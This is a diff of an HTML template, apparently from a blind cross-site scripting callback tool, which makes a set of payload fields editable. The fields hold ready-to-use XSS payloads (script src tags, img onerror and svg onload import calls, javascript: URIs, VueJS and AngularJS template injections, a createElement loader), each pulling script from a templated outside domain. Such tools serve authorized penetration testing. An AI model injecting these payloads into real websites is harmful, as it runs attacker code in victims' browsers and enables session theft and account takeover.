@@ -39,52 +39,51 @@
                             <div class="form-group">
                                 <label class="control-label">SCRIPT src</label><label class="shortboost"
                                     domain="{%data domain}" class="control-label"></label>
-                                
-                                <input class="form-control scriptsrc" disabled
+                                <input class="form-control scriptsrc"
                                     value="&lt;script src=//{%data domain}&gt;&lt;/script&gt;"><br>
 
                                 <label class="control-label">SCRIPT src with closing tag</label>
-                                <input class="form-control scriptsrc" disabled
+                                <input class="form-control scriptsrc"
                                     value="&quot;&gt;&lt;script src=//{%data domain}&gt;&lt;/script&gt;"><br>
 
                                 <label class="control-label">SCRIPT src with closing and opening tag</label>
-                                <input class="form-control scriptsrc" disabled
+                                <input class="form-control scriptsrc"
                                     value="&quot;&gt;&lt;script src=//{%data domain}&gt;&lt;/script&gt;&lt;x=&quot;"><br>
 
                                 <label class="control-label">jQuery</label>
-                                <input class="form-control scriptsrc" disabled
+                                <input class="form-control scriptsrc"
                                     value="$.getScript(&quot;//{%data domain}&quot;)"><br>
 
                                 <label class="control-label">IMG onerror with closing tag</label>
-                                <input class="form-control scriptsrc" disabled
+                                <input class="form-control scriptsrc"
                                     value="&quot;&gt;&lt;img src onerror=import(&apos;//{%data domain}&apos;)&gt;"><br>
 
                                 <label class="control-label">IMG onerror no spaces with closing tag</label>
-                                <input class="form-control scriptsrc" disabled
+                                <input class="form-control scriptsrc"
                                     value="&quot;&gt;&lt;img/src/onerror=import(&apos;//{%data domain}&apos;)&gt;"><br>
 
                                 <label class="control-label">SVG script with closing tag</label>
-                                <input class="form-control scriptsrc" disabled
+                                <input class="form-control scriptsrc"
                                     value="&quot;&gt;&lt;svg&gt;&lt;script href=//{%data domain} /&gt;"><br>
 
                                 <label class="control-label">SVG onload with closing tag</label>
-                                <input class="form-control scriptsrc" disabled
+                                <input class="form-control scriptsrc"
                                     value="&quot;&gt;&lt;svg/onload=import(&apos;//{%data domain}&apos;)&gt;"><br>
 
                                 <label class="control-label">Link based URI payload</label>
-                                <input class="form-control scriptsrc" disabled
+                                <input class="form-control scriptsrc"
                                     value="javascript:import(&apos;//{%data domain}&apos;)"><br>
 
                                 <label class="control-label">VueJS v3</label>
-                                <input class="form-control scriptsrc" disabled
+                                <input class="form-control scriptsrc"
                                     value="{{_openBlock.constructor(&apos;import(&quot;//{%data domain}&quot;)&apos;)()}}"><br>
 
                                 <label class="control-label">VueJS v2 AngularJS</label>
-                                <input class="form-control scriptsrc" disabled
+                                <input class="form-control scriptsrc"
                                     value="{{constructor.constructor(&apos;import(&quot;//{%data domain}&quot;)&apos;)()}}"><br>
 
                                 <label class="control-label">Create Element</label>
-                                <input class="form-control scriptsrc" disabled
+                                <input class="form-control scriptsrc"
                                     value="javascript:eval(&apos;var a=document.createElement(\&apos;script\&apos;);a.src=\&apos;//{%data domain}\&apos;;document.body.appendChild(a)&apos;)">
                             </div>
                         </div>
